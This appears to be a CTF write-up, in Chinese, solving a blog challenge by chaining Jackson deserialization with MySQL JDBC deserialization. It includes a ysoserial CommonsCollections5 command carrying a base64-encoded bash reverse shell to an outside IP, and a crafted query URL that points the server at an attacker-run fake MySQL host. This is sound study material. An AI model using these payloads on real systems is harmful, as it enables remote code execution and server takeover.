把hint文件夹中的pom.xml放出来作为提示

#### 题目名
zzm's blog

#### 查看文章，发现提示
I heard that fastjson has many vulnerabilities, so I used jackson to replace it in my blog.
说明题目使用了jackson

#### 使用jackson反序列化漏洞 + jdbc反序列化漏洞进行rce
1. 查看提示中的pom.xml，发现使用了commons-collections和mysql-connector-java，没有其它可利用的gadget
2. 因此想到先用com.mysql.cj.jdbc.admin.MiniAdmin伪造jdbc链接，然后构造jdbc反序列化利用链即可，jdbc反序列化使用的gadget是commons-collections
3. 首先在自己vps上放一个mysql.py文件(伪造mysql客户端)，然后用ysoserial.jar生成CommonsCollections5的payload（使用了jdk8，因此CommonsCollections3不能用）。
比如下面这条命了生成的payload可以反弹shell
> java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,L2Jpbi9iYXNoICAtaSA+IC9kZXYvdGNwLzExMS4yMjkuMjExLjcxLzc3NzcgMDwmMSAyPiYx}|{base64,-d}|{bash,-i}"  > payload.ser

然后将mysql.py和payload.ser放在同一目录，启动mysql.py即可

然后访问
http://题目地址/?query={%22id%22:[%22com.mysql.cj.jdbc.admin.MiniAdmin%22,%20%22jdbc:mysql://111.229.211.71:3305/mysql?characterEncoding=utf8%26useSSL=false%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize=true%22]}
即可反弹shell，flag文件在/tmp目录下面，读取即可